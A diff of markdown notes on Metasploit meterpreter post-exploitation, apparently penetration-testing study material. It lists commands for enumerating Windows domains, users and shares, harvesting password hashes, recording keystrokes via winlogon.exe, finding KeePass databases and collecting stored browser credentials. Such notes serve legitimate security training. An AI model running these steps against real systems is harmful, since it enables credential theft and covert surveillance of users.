@@ -22,34 +22,44 @@ Commands inside of meterpreter for pillaging data
 - sysinfo
 -- if server, for example, we would know to search and see what type of services are running (in shell this would be `wmic service where started=true get catption`
 - getuid
+
 Meterpreter has a good set of gather utilities under:
 - run post/windows/gather OR
 - run post/linux/gather
 These can also be used outsie of the meterpreter session. You just need to use the `use` command, configure its options with `set` and then execute the module with `run`
+
 ### Windows
 - run post/windows/gather/enum_domains
+
 If the machine is part of a domain, we can enumerate accounts and other information in the default active domain
 - run post/windows/gather/enum_ad_users
 - In a shell, run `net localgroup` to list groups and `net localgroup [GROUPNAME]` to list members of a specific group
 To figure out what resources are shared:
 - run enum_shares (same as `net share` in a shell)
+
 The two main scripts to use against windows hosts are:
 - scraper - harvests system info including network shares, registry hives, and password hashes
 - winenum - retrieves all kinds of info about the system including env vars, networking interfaces, routing, user accounts, and much more
 - Both of the above are invoked using `run winenum` or `run scraper`. Files are saved locally.
+
 Keyloggers:
 These only record the keys of the process the session has been migrated to. So if you want info when a user logs into their computer, you need to be migrated to the `winlogon.exe` process.
 - `run keylogrecorder` <- there is a `-c` option that allows you to automate the migration into the correct process.
 - `run post/windows/capture/keylog_recorder`
+
 Searching for files:
 - From a meterpreter session: `search -d C:\\Users\\els\\ -f *.kdbx` <- password database file extension
+
 Downloading files:
 - use the download command.
+
 Gather Credentials:
 - `run post/windows/gather/credentials/`
 - In the parent directory, there are useful scripts as well. For example the `enum_chrome` script can be used to gather credentials stored in Google Chrome
+
 List Applications:
 - `run post/windows/gather/enum_applications`
+
 Other:
 - `run post/windows/gather/credentials/credential_collector`
 
